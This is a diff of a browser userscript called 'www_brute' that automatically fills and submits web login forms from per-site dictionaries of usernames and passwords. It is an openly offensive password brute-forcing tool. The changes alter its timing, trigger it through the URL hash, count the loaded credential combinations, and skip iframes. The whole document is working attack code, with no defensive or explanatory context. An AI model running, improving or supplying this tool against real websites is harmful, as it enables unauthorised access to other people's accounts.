@@ -5,8 +5,9 @@
 // @grant       none
 // ==/UserScript==
 
-var BRUTE_INTERVAL_MS = 3000
+var BRUTE_INTERVAL_MS = 125 * 1000
 var user_field, pass_field, submit_field, brute_offset
+var hash
 
 function init()
 {
@@ -190,11 +191,11 @@ function send()
 
 function is_allow(dict)
 {
-	for( var loc = 0; loc < window.__brute[dict].allow.length; loc++ )
-		if(! window.__brute[dict].allow[loc].test( location.host ) )
+	for( var loc = 0; loc < dict.allow.length; loc++ )
+		if(! dict.allow[loc].test( location.host ) )
 			return false
-	for( var loc = 0; loc < window.__brute[dict].deny.length; loc++ )
-		if( window.__brute[dict].deny[loc].test( location.host ) )
+	for( var loc = 0; loc < dict.deny.length; loc++ )
+		if( dict.deny[loc].test( location.host ) )
 			return false
 	return true
 }
@@ -212,7 +213,7 @@ function do_brute(intr)
 
 	for( var dict = 0; dict < window.__brute.length; dict++ )
 	{
-		if(! is_allow(dict) )
+		if(! is_allow( window.__brute[dict] ) )
 			continue
 		for( var i = 0; i < window.__brute[dict].combo.length; i++ )
 		{
@@ -252,12 +253,36 @@ function do_brute(intr)
 
 function in_url(what)
 {
-	return (location.search.indexOf(what) == -1) ? false : true
+	return (location.hash.indexOf(what) == -1) ? false : true
 }
 
-	
+function enum_dicts()
+{
+	var dictionary, combo_count = 0, users_count = 0, passwords_count = 0
+	for( var i = 0 ; i < window.__brute.length; i++ )
+	{
+		if( is_allow( dictionary = window.__brute[i] ) )
+		{
+			combo_count += dictionary.combo.length
+			users_count += dictionary.users.length
+			passwords_count += dictionary.passwords.length
+		}
+	}
+	console.log(
+		"combo: " + combo_count + "\n" +
+		"users: " + users_count + "\n" +
+		"passwords: " + passwords_count + "\n"
+	)
+}
+
+
 function brute()
-{	
+{
+	if( location.hash == hash )
+		return
+	else
+		hash = location.hash
+
 	if( in_url('__reset') )
 	{
 		reset()
@@ -272,7 +297,8 @@ function brute()
 			pass_field = get_element('pass')
 			submit_field = get_element('submit')
 			if(user_field && pass_field && submit_field)
-				intr = setInterval( function() { do_brute(intr) }, BRUTE_INTERVAL_MS )
+				//intr = setInterval( function() { do_brute(intr) }, BRUTE_INTERVAL_MS )
+				do_brute(0)
 			else
 				setTimeout(get_userpass_fields, 1000)
 		}
@@ -285,10 +311,24 @@ function brute()
 	}
 }
 
+function frame_exception(mess)
+{
+	console.info(mess)
+}
+
+function in_frame()
+{
+	return window.location.href != window.top.location.href
+}
+
+if( in_frame() )
+	throw frame_exception('skipping frame')
+
 try
 {
-	console.info('[*] www_brute v0.13')
-	brute()
+	console.info('www_brute v0.15')
+	enum_dicts()
+	setInterval( brute, 1000 )
 }
 catch(exc)
 { 
